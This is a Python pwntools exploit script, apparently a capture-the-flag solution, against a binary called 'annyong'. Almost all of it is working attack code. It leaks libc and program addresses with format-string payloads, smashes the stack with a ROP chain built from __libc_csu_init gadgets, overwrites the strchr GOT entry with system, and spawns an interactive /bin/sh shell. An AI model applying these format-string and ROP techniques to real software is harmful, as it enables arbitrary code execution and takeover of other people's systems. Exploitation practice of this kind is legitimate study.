from pwn import *


binpath = './annyong'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']


elf = ELF(binpath)
libc = elf.libc


gdbscript = '''
peda
# main
b *(0x0000555555554000+0x108C)
# just before fgets
b *0x5555555550bc
b *(0x0000555555554000+0x111C)
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)


# leak libc with FSB
fsb = '%267$p'
io.sendline(fsb)
data = io.recvline()
while 'ote' in data:
    data = io.recvline()
addr_libc = int(data, 16) - 0x20830
print 'addr_libc = 0x{:x}'.format(addr_libc)


fsb = '%7$p'
io.sendline(fsb)
data = io.recvline()
addr_prog = int(data, 16) - 0x644
print 'addr_prog = 0x{:x}'.format(addr_prog)


addr_g1 = addr_prog + 0x1196
addr_g2 = addr_prog + 0x1180

# Use universal rop gadget at __libc_csu_init.
# (ref: http://inaz2.hatenablog.com/entry/2014/07/31/010158)
# With the universal rop gadget call read(0, addr_got_strchr, 8).
# overwrite got of strchr with system.
# call strchr("/bin/sh") -> system("/bin/sh").
payload = ''
payload += 'n' * 0x818
payload += p64(addr_g1)  # setting registers at __libc_csu_init
payload += p64(0xdeadbeafdeadbeaf)
payload += p64(0x00)  # rbx
payload += p64(0x01)  # rbp
payload += p64(addr_prog + elf.got['read'])  # r12
payload += p64(0x00)  # r13 -> edi
payload += p64(addr_prog + elf.got['strchr'])  # r14 -> rsi
payload += p64(0x8)  # r15 -> rdx
payload += p64(addr_g2)
payload += 'B' * 0x38
payload += p64(addr_prog + 0x108c)  # go back to main

io.sendline(payload)

io.recvuntil("I don't think so...\n")

io.send(p64(addr_libc + libc.symbols['system']))

io.sendline('/bin/sh\x00')

io.interactive()
